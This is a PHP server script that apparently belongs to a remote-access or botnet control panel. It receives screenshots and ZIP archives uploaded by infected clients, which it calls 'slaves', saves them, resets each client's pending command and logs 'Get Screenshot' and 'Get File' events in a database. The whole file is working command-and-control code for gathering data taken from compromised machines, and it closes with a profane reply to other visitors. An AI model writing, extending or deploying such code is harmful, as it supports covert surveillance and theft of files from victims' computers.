<?php
include 'conn.php';

$uploads_dir = './files';
$name = uniqid();
if (isset($_FILES["file"]["name"]) && $_FILES["file"]["error"] == UPLOAD_ERR_OK)
{

    $tmp_name = $_FILES["file"]["tmp_name"];
    $name = $_FILES["file"]["name"];

  if(pathinfo($name,PATHINFO_EXTENSION) == "png" && $_FILES["file"]["size"] < 52428800)
    {
      if(strpos($name, '_'))
      {
    $parsedName = explode("_", $name);
        if(!preg_match("[\W]", $parsedName[0]))
          {
              if (function_exists('openssl_random_pseudo_bytes')){
              $nameWithEntropy = uniqid(bin2hex(openssl_random_pseudo_bytes(16)));
                }
                else{
                    $nameWithEntropy = uniqid();
                }
                    $saveName = $parsedName[0] . "_" . $nameWithEntropy.".png";
                    $dbImagePathVariable = $uploads_dir . "/" . $saveName;

      if(move_uploaded_file($tmp_name, "$uploads_dir/$saveName"))
      {
        $virtualResponse = "Screenshot saved to " . $dbImagePathVariable;
        $addFilePath = $conn->prepare("UPDATE slaves set slaveResponse=?, slaveLatestImagePath=?, slaveCommand='' where slaveId=?");
        $addFilePath->bind_param("sss",$virtualResponse,$dbImagePathVariable,$parsedName[0]);
        $addFilePath->execute();
        $insertLog = $conn->prepare("INSERT INTO logs(logDate, logType, logClient, logContent) values(NOW(),'Get Screenshot',?,?)");
        $insertLog->bind_param("ss",$parsedName[0],$virtualResponse );
        $insertLog->execute();
        $insertLog->close();
      }

          else
          {
            $virtualResponse = "Operation failed.";
            $addFilePath = $conn->prepare("UPDATE slaves set slaveResponse=?, slaveLatestImagePath=?, slaveCommand='' where slaveId=?");
            $addFilePath->bind_param("sss",$virtualResponse,$dbImagePathVariable,$parsedName[0]);
            $addFilePath->execute();
          }
        }
        else{
          die();
        }
      }
        else{
          die();
        }
    }
elseif(pathinfo($name,PATHINFO_EXTENSION) == "zip" && $_FILES["file"]["size"] < 52428800){ //50 MB max.

  if(strpos($name, '_'))
  {
  $parsedName = explode("_", $name);
      if(!preg_match("[\W]", $parsedName[0]))
      {
        if (function_exists('openssl_random_pseudo_bytes')){
        $nameWithEntropy = uniqid(bin2hex(openssl_random_pseudo_bytes(16)));
          }
          else{
              $nameWithEntropy = uniqid();
          }
  $saveName = $parsedName[0] . "_" . $nameWithEntropy.".zip";
  $dbzipFilePathVariable = $uploads_dir . "/" . $saveName;
  if(move_uploaded_file($tmp_name, "$uploads_dir/$saveName"))
  {
    $virtualResponse = "Zip file saved to " . $dbzipFilePathVariable;
    $addFilePath = $conn->prepare("UPDATE slaves set slaveResponse=?,slaveCommand='' where slaveId=?");
    $addFilePath->bind_param("ss",$virtualResponse,$parsedName[0]);
    $addFilePath->execute();
    $insertLog = $conn->prepare("INSERT INTO logs(logDate, logType, logClient, logContent) values(NOW(),'Get File',?,?)");
    $insertLog->bind_param("ss",$parsedName[0],$virtualResponse );
    $insertLog->execute();
    $insertLog->close();
  }

      else
      {
        $virtualResponse = "Operation failed.";
        $addFilePath = $conn->prepare("UPDATE slaves set slaveResponse=?, slaveCommand='' where slaveId=?");
        $addFilePath->bind_param("ss",$virtualResponse,$parsedName[0]);
        $addFilePath->execute();
      }
   }
   else{
     die();
   }
}
else{
  die();
}
}
else
  {
  echo "Fuck off boomer.";
  }

}
?>
